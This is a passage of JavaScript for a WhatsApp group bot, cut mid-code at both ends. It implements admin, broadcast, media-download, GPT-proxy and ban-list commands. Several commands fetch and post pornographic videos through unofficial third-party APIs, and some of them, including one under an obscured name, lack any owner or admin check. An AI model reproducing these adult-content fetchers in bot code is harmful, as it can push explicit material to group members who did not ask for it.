                if (!isCreator) return reply("🔒 *Owner only*");
                if (!m.quoted) return reply("🗑️ *Reply to a message to delete it*");

                devtrust.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                });
            }
                break;

            case 'grouplink': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');

                let response = await devtrust.groupInviteCode(m.chat);
                reply(`🔗 *Group Link*\nhttps://chat.whatsapp.com/${response}`);
            }
                break;

            case 'tag':
            case 'totag': {
                if (!isCreator) return reply("🔒 *Owner only*");
                if (!m.isGroup) return reply("👥 *Groups only*");
                if (!isAdmins) return reply("👑 *Admin only*");
                if (!m.quoted) return reply(`💬 *Reply to a message with ${prefix + command}*`);

                devtrust.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                });
            }
                break;

            case 'broadcast': {
                if (!isCreator) return reply("🔒 *Owner only*");
                if (!q) return reply(`📢 *No broadcast message provided*`);

                let getGroups = await devtrust.groupFetchAllParticipating();
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
                let res = groups.map(v => v.id);

                reply(`📨 *Broadcasting to ${res.length} groups*`);

                for (let i of res) {
                    await devtrust.sendMessage(i,
                        addNewsletterContext({
                            image: { url: "https://i.ibb.co/rGr4bWW8/image1.jpg" },
                            caption: `📢 *Broadcast*\n\n${qtext}`
                        })
                    );
                }

                reply(`✅ *Broadcast sent to ${res.length} groups*`);
            }
                break;

            case "spotify":
            case "spotifydl":
            case "sp": {
                if (!text) {
                    return reply(`🎧 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Spotify*\n\nUsage: ${prefix}spotify [spotify_track_link]\nExample: ${prefix}spotify https://open.spotify.com/track/xxxxx`);
                }

                // Validate Spotify URL
                if (!text.includes('open.spotify.com/track/')) {
                    return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Spotify*\n\nInvalid Spotify track link. Please provide a valid track URL.`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });

                    reply(`🔍 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Spotify*\n\nFetching track: ${text.split('/track/')[1]?.substring(0, 10)}...`);

                    const response = await axios.get(`https://apis.davidcyril.name.ng/spotifydl2`, {
                        params: {
                            url: text,
                            apikey: ""
                        },
                        timeout: 30000
                    });

                    if (response.data.success && response.data.results) {
                        const result = response.data.results;

                        // Send audio with rich preview
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                audio: { url: result.downloadMP3 },
                                mimetype: 'audio/mpeg',
                                fileName: `${result.title}.mp3`,
                                contextInfo: {
                                    externalAdReply: {
                                        title: result.title,
                                        body: `🎧 ${result.type || 'Track'}`,
                                        thumbnailUrl: result.image,
                                        mediaType: 1,
                                        renderLargerThumbnail: true,
                                        sourceUrl: text
                                    }
                                }
                            }),
                            { quoted: m }
                        );

                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    } else {
                        throw new Error('No download link found');
                    }

                } catch (error) {
                    console.error('Spotify error:', error.message);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });

                    if (error.response?.status === 404) {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Spotify*\n\nTrack not found. Check the link and try again.`);
                    }

                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Spotify*\n\nSpotify service is on break. Try again later.`);
                }
            }
                break;

            case 'groupstatus':
            case 'gstatus':
            case 'gst': {
                if (!m.isGroup) {
                    return reply(`👥 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nThis command can only be used in groups.`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '📢', key: m.key } });

                    // Check if replying to a message or providing text
                    const quotedMsg = m.quoted;
                    const textInput = text;

                    if (!quotedMsg && !textInput) {
                        return reply(`📢 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nReply to an image/video/audio or provide text to post as group status.\n\nExample: ${prefix}gstatus Hello group!`);
                    }

                    // Simple random ID generator
                    function generateMessageId() {
                        return '3EB0' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
                    }

                    let statusInnerMessage = {};

                    // ==========================================
                    // 1. HANDLE TEXT STATUS (BLACK BACKGROUND)
                    // ==========================================
                    if (!quotedMsg && textInput) {
                        statusInnerMessage = {
                            extendedTextMessage: {
                                text: textInput,
                                backgroundArgb: 0xFF000000, // BLACK background
                                textArgb: 0xFFFFFFFF, // White text
                                font: 1,
                                contextInfo: {
                                    mentionedJid: [],
                                    isGroupStatus: true
                                }
                            }
                        };

                        // Create and send status
                        const statusPayload = {
                            groupStatusMessageV2: {
                                message: statusInnerMessage
                            }
                        };

                        const statusId = generateMessageId();
                        await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });

                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                        return reply(`📢 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nText status posted!`);
                    }

                    // ==========================================
                    // 2. HANDLE QUOTED MEDIA/TEXT
                    // ==========================================
                    else if (quotedMsg) {
                        // Check if it's a media message
                        const mime = (quotedMsg.msg || quotedMsg).mimetype || '';

                        // IMAGE STATUS
                        if (/image/.test(mime)) {
                            // Download image
                            let media = await quotedMsg.download();

                            // Send as image status
                            await devtrust.sendMessage(m.chat, {
                                image: media,
                                caption: textInput || quotedMsg.caption || '',
                                contextInfo: { isGroupStatus: true }
                            });
                        }

                        // VIDEO STATUS
                        else if (/video/.test(mime)) {
                            // Download video
                            let media = await quotedMsg.download();

                            // Send as video status
                            await devtrust.sendMessage(m.chat, {
                                video: media,
                                caption: textInput || quotedMsg.caption || '',
                                contextInfo: { isGroupStatus: true }
                            });
                        }

                        // AUDIO STATUS (NEW)
                        else if (/audio/.test(mime)) {
                            // Download audio
                            let media = await quotedMsg.download();

                            // Send as audio status
                            await devtrust.sendMessage(m.chat, {
                                audio: media,
                                mimetype: 'audio/mpeg',
                                ptt: false, // true for voice note
                                contextInfo: { isGroupStatus: true }
                            });
                        }

                        // TEXT STATUS (Quoted text - BLACK BACKGROUND)
                        else if (quotedMsg.conversation || quotedMsg.text) {
                            const textContent = quotedMsg.conversation || quotedMsg.text || textInput;

                            statusInnerMessage = {
                                extendedTextMessage: {
                                    text: textContent,
                                    backgroundArgb: 0xFF000000, // BLACK background
                                    textArgb: 0xFFFFFFFF, // White text
                                    font: 2,
                                    contextInfo: {
                                        mentionedJid: [],
                                        isGroupStatus: true
                                    }
                                }
                            };

                            const statusPayload = {
                                groupStatusMessageV2: {
                                    message: statusInnerMessage
                                }
                            };

                            const statusId = generateMessageId();
                            await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });

                        } else {
                            return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nUnsupported media type. Reply to image, video, audio, or text only.`);
                        }

                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
                        reply(`📢 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nStatus posted!`);
                    }

                } catch (error) {
                    console.error('Group Status Error:', error);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Group Status*\n\nFailed: ${error.message}`);
                }
            }
                break;

            case 'tagall': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const textMessage = args.join(" ") || "No message";
                let teks = `🏷️ *Tag All*\n\n📝 ${textMessage}\n\n`;

                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                devtrust.sendMessage(m.chat, addNewsletterContext({
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }), { quoted: m });
            }
                break;

            case 'hidetag': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                devtrust.sendMessage(m.chat, addNewsletterContext({
                    text: q || ' ',
                    mentions: participants.map(a => a.id)
                }), { quoted: m });
            }
                break;

            case 'promote': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const botId = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
                const botIsAdmin = groupAdmins.includes(botId);
                if (!botIsAdmin) return reply("❌ *Bot is not an admin!* Unable to execute command.");

                let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                await devtrust.groupParticipantsUpdate(m.chat, [users], 'promote').catch(() => null);
                reply("👑 *User promoted to admin*");
            }
                break;

            case 'demote': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const botId = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
                const botIsAdmin = groupAdmins.includes(botId);
                if (!botIsAdmin) return reply("❌ *Bot is not an admin!* Unable to execute command.");

                let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                await devtrust.groupParticipantsUpdate(m.chat, [users], 'demote').catch(() => null);
                reply("⬇️ *User demoted from admin*");
            }
                break;

            case 'mute': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const botId = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
                const botIsAdmin = groupAdmins.includes(botId);
                if (!botIsAdmin) return reply("❌ *Bot is not an admin!* Unable to execute command.");

                await devtrust.groupSettingUpdate(m.chat, 'announcement').catch(() => null);
                reply("🔇 *Group muted* • Only admins can message");
            }
                break;

            case 'unmute': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const botId = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
                const botIsAdmin = groupAdmins.includes(botId);
                if (!botIsAdmin) return reply("❌ *Bot is not an admin!* Unable to execute command.");

                await devtrust.groupSettingUpdate(m.chat, 'not_announcement').catch(() => null);
                reply("🔊 *Group unmuted* • Everyone can message");
            }
                break;

            case 'left': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                await devtrust.groupLeave(m.chat).catch(() => null);
            }
                break;

            case 'add': {
                if (!m.isGroup) return reply("👥 *Groups only*");
                const groupMetadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                const participants = groupMetadata?.participants || [];
                const groupAdmins = getGroupAdmins(participants);
                const isAdmins = groupAdmins.includes(m.sender);
                if (!isCreator && !isAdmins) return reply("🔒 *This feature is for Admins or Owner only*");

                const botId = devtrust.user.id.split(':')[0] + '@s.whatsapp.net';
                const botIsAdmin = groupAdmins.includes(botId);
                if (!botIsAdmin) return reply("❌ *Bot is not an admin!* Unable to execute command.");

                let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                await devtrust.groupParticipantsUpdate(m.chat, [users], 'add').catch(() => null);
                reply("✅ *User added to group*");
            }
                break;


            case 'setpp': {
                if (!isCreator) return reply('🔒 *Owner only*');
                if (!quoted || !/image/.test(mime)) return reply(`🖼️ *Reply to an image with ${prefix}setpp*`);

                let media = await quoted.download();
                await devtrust.updateProfilePicture(botNumber, media);
                reply('✅ *Profile picture updated*');
            }
                break;

            case 'react-ch':
            case 'reactbcnch': {
                if (!isCreator) return reply(`🔒 *Owner only*`);

                if (!args[0]) {
                    return reply("📌 *Usage:* reactch https://whatsapp.com/channel/... Robin");
                }

                if (!args[0].startsWith("https://whatsapp.com/channel/")) {
                    return reply("❌ *Invalid channel link*");
                }

                const hurufGaya = {
                    a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
                    h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
                    o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
                    v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
                    '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
                    '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
                };

                const emojiInput = args.slice(1).join(' ');
                const emoji = emojiInput.split('').map(c => {
                    if (c === ' ') return '―';
                    const lower = c.toLowerCase();
                    return hurufGaya[lower] || c;
                }).join('');

                try {
                    const link = args[0];
                    const channelId = link.split('/')[4];
                    const messageId = link.split('/')[5];

                    const res = await devtrust.newsletterMetadata("invite", channelId);
                    await devtrust.newsletterReactMessage(res.id, messageId, emoji);

                    reply(`✅ *Reacted* ${emoji} in channel ${res.name}`);
                } catch (e) {
                    console.error(e);
                    reply("❌ *Failed to send reaction*");
                }
            }
                break;

            case "gpt4": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message && m.message.extendedTextMessage &&
                        m.message.extendedTextMessage.contextInfo &&
                        m.message.extendedTextMessage.contextInfo.quotedMessage) {

                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage && quoted.extendedTextMessage.text)
                            query = quoted.extendedTextMessage.text;
                    }

                    if (!query) {
                        return reply("🤖 *Usage:* gpt4 your question");
                    }

                    const res = await fetch(`https://apis.prexzyvilla.site/ai/gpt4?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error* • ${res.status}`);

                    const json = await res.json();
                    const answer = json?.data || "";

                    if (!answer) return reply("⚠️ *No response from GPT-4*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *GPT-4*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error("gpt4 command error:", err);
                    reply("⚠️ *GPT-4 unavailable* • Try later");
                }
            }
                break;

            case 'mode': {
                reply(`🔹 *Mode:* ${devtrust.public ? 'Public' : 'Private'}`);
            }
                break;

            case 'ping':
            case 'speed': {
                const speed = require('performance-now');
                const timestampp = speed();
                const latensi = speed() - timestampp;

                reply(`⚡ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Ping*\n\n📡 ${latensi.toFixed(4)} ms`);
            }
                break;

            case 'runtime':
            case 'alive': {
                reply(`⚡ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Uptime*\n\n⏱️ ${runtime(process.uptime())}`);
            }
                break;

            case 'public': {
                if (!isCreator) return reply("🔒 *Owner only*");

                setSetting("bot", "mode", "public");
                devtrust.public = true;
                reply("🌍 *Public mode activated*\nEveryone can use the bot");
            }
                break;

            case 'private':
            case 'self': {
                if (!isCreator) return reply("🔒 *Owner only*");

                setSetting("bot", "mode", "self");
                devtrust.public = false;
                reply("🔐 *Private mode activated*\nOnly owner can use the bot");
            }
                break;

            case 'readmore': {
                const more = String.fromCharCode(8206);
                const readmore = more.repeat(4001);

                let [leftText, rightText] = text.split('|');
                if (!leftText) leftText = '';
                if (!rightText) rightText = '';

                const fullText = leftText + readmore + rightText;

                devtrust.sendMessage(m.chat, addNewsletterContext({ text: fullText }), { quoted: m });
                break;
            }

            case "banuser1":
            case "banuser": {
                if (!isCreator) return reply("🔒 *Owner only*");

                if (m.quoted || text) {
                    let orang = m.mentionedJid[0] ? m.mentionedJid[0] :
                        text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' :
                            m.quoted ? m.quoted.sender : '';

                    if (global.banned[orang]) return reply(`⚠️ *User already banned*`);

                    global.banned[orang] = true;

                    // Save to file
                    try {
                        fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
                    } catch (e) {
                        console.log("Error saving banned.json:", e);
                    }

                    reply(`🚫 *User @${orang.split('@')[0]} banned*`, [orang]);
                } else {
                    return reply("👤 *Tag or reply to user*");
                }
            }
                break;

            case "unbanuser1":
            case "unbanuser": {
                if (!isCreator) return reply("🔒 *Owner only*");

                if (m.quoted || text) {
                    let orang = m.mentionedJid[0] ? m.mentionedJid[0] :
                        text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' :
                            m.quoted ? m.quoted.sender : '';

                    if (!global.banned[orang]) return reply(`⚠️ *User not in ban list*`);

                    delete global.banned[orang];

                    // Save to file
                    try {
                        fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
                    } catch (e) {
                        console.log("Error saving banned.json:", e);
                    }

                    reply(`✅ *User @${orang.split('@')[0]} unbanned*`, [orang]);
                } else {
                    return reply("👤 *Tag or reply to user*");
                }
            }
                break;

            case "listban":
            case "listbanuser": {
                if (!isCreator) return reply("🔒 *Owner only*");

                // Get all users where banned is true
                const bannedUsers = Object.keys(global.banned).filter(jid => global.banned[jid] === true);

                if (bannedUsers.length < 1) return reply("📭 *No banned users*");

                let teksnya = `🚫 *Banned Users*\n\n`;
                bannedUsers.forEach(jid => teksnya += `• @${jid.split("@")[0]}\n`);

                await devtrust.sendMessage(m.chat, addNewsletterContext({
                    text: teksnya,
                    mentions: bannedUsers
                }), { quoted: m });
            }
                break;

            case 'git':
            case 'gitclone': {
                if (!args[0]) return reply(`🔗 *Usage:* ${prefix}${command} https://github.com/...`);
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`❌ *Invalid GitHub link*`);

                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
                let [, user, repo] = args[0].match(regex1) || [];
                repo = repo.replace(/.git$/, '');

                let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
                let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1];

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        document: { url: url },
                        fileName: filename + '.zip',
                        mimetype: 'application/zip'
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'coffee':
            case 'kopi': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://coffee.alexflipnote.dev/random' },
                        caption: "☕ *Fresh Coffee*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'gxhxhxh':
            case 'styletext': {
                if (!text) return reply(`✏️ *Example:* styletext Hello`);

                let anu = await styletext(text);
                let teks = `🎨 *Style Text*\n\n"${text}"\n\n`;

                for (let i = 0; i < anu.length; i++) {
                    teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`;
                }

                await reply(teks);
            }
                break;
            case "xvideodl": {
                if (!isCreator) return reply("Owner only");
                if (!text) return m.reply(example(`xvideo link`))
                // Check if link is from xvideo
                if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
                await devtrust.sendMessage(m.chat, { react: { text: '🍑', key: m.key } })
                // Fetching video data from API
                try {
                    let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
                    let json = await res.json();

                    // Bad response from API
                    if (json.status !== 200 || !json.data) {
                        throw "Cannot find video for this URL.";
                    }

                    // Retrieving video information from API
                    let videoData = json.data;

                    // Download videos using URLs obtained from API
                    const videoUrl = videoData.url;
                    const videoResponse = await fetch(videoUrl);

                    // Check if the video was downloaded successfully
                    if (!videoResponse.ok) {
                        throw "Failed to download video.";
                    }

                    // Send video
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        video: {
                            url: videoUrl,
                        },
                        caption: `*Title:* ${videoData.title || 'No title'}\n` +
                            `*Views:* ${videoData.views || 'No view information'}\n` +
                            `*Votes:* ${videoData.vote || 'No vote information'}\n` +
                            `*Likes:* ${videoData.like_count || 'No like information'}\n` +
                            `*Dislikes:* ${videoData.dislike_count || 'No dislike information'}`,
                    }));
                    await devtrust.sendMessage(m.chat, { react: { text: '', key: m.key } })
                } catch (e) {
                    console.log(`Error downloading video: ${e}`);
                }
            }
                break;
            case "xnxxvideodl": {
                if (!isCreator) return reply("Owner only");
                if (!text) return m.reply(example(`xnxx videolink`))
                // Check if link is from xvideo
                if (!text.includes("xnxx.com")) return m.reply("Link is not from xnxx.com")
                await devtrust.sendMessage(m.chat, { react: { text: '🍑', key: m.key } })
                // Fetching video data from API
                try {
                    let res = await fetch(`https://apis.prexzyvilla.site/nsfw/xnxx-dl?url=${encodeURIComponent(text)}`);
                    let json = await res.json();

                    // Bad response from API
                    if (json.status !== 200 || !json.data) {
                        throw "Cannot find video for this URL.";
                    }

                    // Retrieving video information from API
                    let videoData = json.data;

                    // Download videos using URLs obtained from API
                    const videoUrl = videoData.url;
                    const videoResponse = await fetch(videoUrl);

                    // Check if the video was downloaded successfully
                    if (!videoResponse.ok) {
                        throw "Failed to download video.";
                    }

                    // Send video
// ✅ BENAR
await devtrust.sendMessage(m.chat, addNewsletterContext({
    video: {
        url: videoUrl,
    },
    caption: `*Title:* ${videoData.title || 'No title'}\n` +
        `*Views:* ${videoData.views || 'No view information'}\n` +
        `*Votes:* ${videoData.vote || 'No vote information'}\n` +
        `*Likes:* ${videoData.like_count || 'No like information'}\n` +
        `*Dislikes:* ${videoData.dislike_count || 'No dislike information'}`,
}), { quoted: m });
                    await devtrust.sendMessage(m.chat, { react: { text: '', key: m.key } })
                } catch (e) {
                    console.log(`Error downloading video: ${e}`);
                }
            }
                break;
            case 'xvideosearch': {
                if (!text) return m.reply(example(`Milf`))
                try {
                    // checking data from api
                    let res = await fetch(`https://apis.prexzyvilla.site/nsfw/xvideos-search?query=${encodeURIComponent(text)}`);
                    let json = await res.json();

                    // checking api response status
                    if (json.status !== 200 || !json.data || json.data.length === 0) {
                        throw 'No videos found for this keyword.';
                    }

                    // fetching search data from api
                    let videos = json.data;
                    let message = `🍑\nxvideo search result\n\n *"${text}"*:\n`;

                    // Composing messages with video information
                    videos.forEach(video => {
                        message += `Title: ${video.title || 'no name'}\n` +
                            `  Duration: ${video.duration || 'no duration'}\n` +
                            `  URL: ${video.url || 'no URL'}\n` +
                            `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
                    });

                    // Sending messages with video lists
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        text: message,
                    }));

                } catch (e) {
                    // Handling errors and sending error messages
                    await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `can't fetch result from query` }));
                }
            }
                break;

            case 'tiktoksearch': {
                if (!text) return reply("🎵 *Enter a search term*");

                try {
                    let query = text;
                    let url = `https://apis.prexzyvilla.site/search/tiktoksearch?q=${encodeURIComponent(query)}`;
                    let response = await fetch(url);
                    let json = await response.json();

                    if (!json.status || !json.data || json.data.length === 0) {
                        return reply("❌ *No results found*");
                    }

                    let videos = json.data.slice(0, 3);

                    for (let i = 0; i < videos.length; i++) {
                        let vid = videos[i];
                        let date = new Date(vid.create_time * 1000);
                        let info = `🎵 *TikTok #${i + 1}*\n\n` +
                            `👍 ${vid.digg_count} likes\n` +
                            `👀 ${vid.play_count} views\n` +
                            `📝 ${vid.title}\n` +
                            `📅 ${date.toDateString()}`;

                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                video: { url: vid.play },
                                caption: info
                            }),
                            { quoted: m }
                        );
                    }
                } catch (err) {
                    console.log(err);
                    reply("❌ *Error fetching TikTok data*");
                }
            }
                break;


            case 'imnxmxg':
            case 'pinterest': {
                if (!q.includes("|")) return reply("📌 *Usage:* pinterest query | amount\nExample: pinterest Naruto | 5");

                let [query, amount] = q.split("|").map(t => t.trim());
                amount = parseInt(amount) || 1;

                if (amount > 20) return reply("⚠️ *Max 20 images*");

                try {
                    let apiUrl = `https://api-rebix.vercel.app/api/pinterest?q=${encodeURIComponent(query)}`;
                    let response = await fetch(apiUrl);

                    if (!response.ok) return reply(`⚠️ *API Error ${response.status}*`);

                    let data = await response.json();

                    if (!data || !Array.isArray(data.result) || data.result.length === 0) {
                        return reply(`❌ *No images found for "${query}"*`);
                    }

                    let images = data.result.filter(Boolean).sort(() => Math.random() - 0.5);
                    let sentCount = 0;

                    for (let imageUrl of images) {
                        if (sentCount >= amount) break;

                        try {
                            await devtrust.sendMessage(m.chat,
                                addNewsletterContext({
                                    image: { url: imageUrl },
                                    caption: `🖼️ *${query}*`
                                })
                            );
                            sentCount++;
                            await sleep(2000);
                        } catch (err) {
                            continue;
                        }
                    }

                    if (sentCount === 0) reply("⚠️ *No accessible images found*");
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Pinterest error* • Try again");
                }
            }
                break;
             
case 'xnxx': {
    if (!q) return reply(`🎵 *HOW TO DOWNLOAD*\n\nType: ${prefix}xnxx url\nExample: ${prefix}xnxx https://www.xnxx.com/video-xxxxxx/title`);
    
    // FIX: Validasi URL lebih dulu
    if (!q.includes('xnxx.com')) return reply('❌ URL must be from xnxx.com');
    
    const loadingMsg = await reply(`🔍 *Fetching...*\n⏳ Please wait...`);
    try {
        const apiUrl = `https://zyrexapi.vercel.app/download/xnxx?apikey=Zyrex&url=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl, { timeout: 60000, headers: { 'Accept':'application/json' } });

        // FIX: log respons lengkap supaya bisa debug
        console.log('[XNXX API]', JSON.stringify(data).slice(0, 300));

        const videoUrl = data?.result?.videoUrl || data?.result?.url || data?.data?.url;
        const title    = data?.result?.title    || data?.data?.title || 'Untitled';

        if (!videoUrl || !videoUrl.startsWith('http')) {
            await devtrust.sendMessage(from, { delete: loadingMsg.key }).catch(()=>{});
            return reply(`🚫 *VIDEO NOT FOUND*\n┌ Query  : \`${q}\`\n└ Status : \`${data?.status ?? 'null'}\`\n\n💡 API mungkin error, coba URL lain.`);
        }

        await devtrust.sendMessage(from, addNewsletterContext({
            video: { url: videoUrl },
            caption: `🎬 *${title}*`,
            mimetype: 'video/mp4'
        }), { quoted: m });
    } catch (err) {
        console.error('DOWNLOAD XNXX ERROR:', err.message);
        reply(`❌ Error: ${err.message}`);
    }
    break;
}


            case 'nsbxmdmfw': {
                try {
                    const apiUrl = 'https://draculazyx-xyzdrac.hf.space/api/hentai';
                    const response = await fetch(apiUrl);

                    if (!response.ok) throw new Error(`HTTP ${response.status}`);

                    const data = await response.json();

                    if (data && data.videoUrl) {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                video: { url: data.videoUrl },
                                caption: `🎥 *${data.title || 'Video'}*\n⚠️ 18+ Content`
                            }),
                            { quoted: m }
                        );
                    } else {
                        reply("❌ *Content unavailable*");
                    }
                } catch (error) {
                    console.error(error);
                    reply("⚠️ *Error fetching content*");
                }
            }
                break;

            case 'buy-panel': {
                await devtrust.sendMessage(m.chat, { react: { text: '🛒', key: m.key } });
                reply(`🛒 *Panel Purchase*\n\n` +
                    `💎 1GB • 2GB • 3GB • 4GB\n` +
                    `💎 5GB • 6GB • 7GB • 8GB\n` +
                    `💎 9GB • 10GB • Unlimited\n\n` +
                    `📩 *DM: +923078071982*`);
            }
                break;

            case 'setaccount': {
                if (!isCreator) return reply('🔒 *Owner only*');

                const text = args.join(' ');
                if (!text.includes('|'))
                    return reply('❌ *Format:* setaccount Name | Number | Bank | Note');

                const [name, number, bank, note] = text.split('|').map(v => v.trim());

                if (!name || !number || !bank)
                    return reply('❌ *Name, number and bank required*');

                const accounts = loadAccounts();
                accounts[sender] = { name, number, bank, note: note || '' };
                saveAccounts(accounts);

                reply('✅ *Account details saved*');
            }
                break;

            case 'aza':
            case 'account': {
                if (!isCreator) return reply("🔒 *Owner only*");

                const accounts = loadAccounts();
                const acc = accounts[sender];

                if (!acc) return reply('❌ *No account details set*\nUse setaccount first');

                await devtrust.sendMessage(m.chat, { react: { text: '💳', key: m.key } });

                reply(`💳 *Account Details*\n\n` +
                    `🏦 ${acc.bank}\n` +
                    `👤 ${acc.name}\n` +
